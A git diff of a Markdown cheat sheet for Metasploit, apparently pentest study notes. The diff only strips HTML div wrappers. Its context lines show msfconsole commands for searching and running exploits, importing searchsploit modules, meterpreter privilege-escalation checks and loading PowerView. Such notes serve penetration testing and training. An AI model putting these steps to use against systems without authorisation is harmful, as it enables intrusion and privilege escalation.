@@ -10,17 +10,11 @@ tags: ["metasploit", "exploit", "vuln", "CVE", "privesc", "meterpreter", "Window
 
 #### Start msfconsole
 
-<div>
-
 ```console
 msfconsole -q
 ```
 
-</div>
-
 #### Basic Commands
-
-<div>
 
 ```console
 # Return to previous page
@@ -37,11 +31,7 @@ sessions -u
 exit
 ```
 
-</div>
-
 #### Search Exploit
-
-<div>
 
 ```console
 # For example: samba
@@ -81,13 +71,9 @@ set lport <LOCAL_PORT>
 run 
 ```
 
-</div>
-
 <small>*Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter*</small>
 
 #### Add scripts from searchsploit
-
-<div>
 
 ```console
 mkdir -p ~/.msf4/modules/exploits/linux
@@ -112,11 +98,7 @@ reload_all
 search 12345
 ```
 
-</div>
-
 #### Fix no search result
-
-<div>
 
 ```console
 # Inside msfconsole, check db status
@@ -140,25 +122,17 @@ sudo msfdb init
 db_status
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
 
 #### Basic Commands
-
-<div>
 
 ```console
 # Return from meterpreter
 background
 ```
 
-</div>
-
 #### Use Exploit
-
-<div>
 
 ```console
 # Quick look of potential privesc (Windows)
@@ -186,11 +160,7 @@ set rhosts <TARGET>
 run 
 ```
 
-</div>
-
 #### Use powershell
-
-<div>
 
 ```console
 # Use powershell module
@@ -207,8 +177,4 @@ powershell_import /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
 powershell_shell 
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
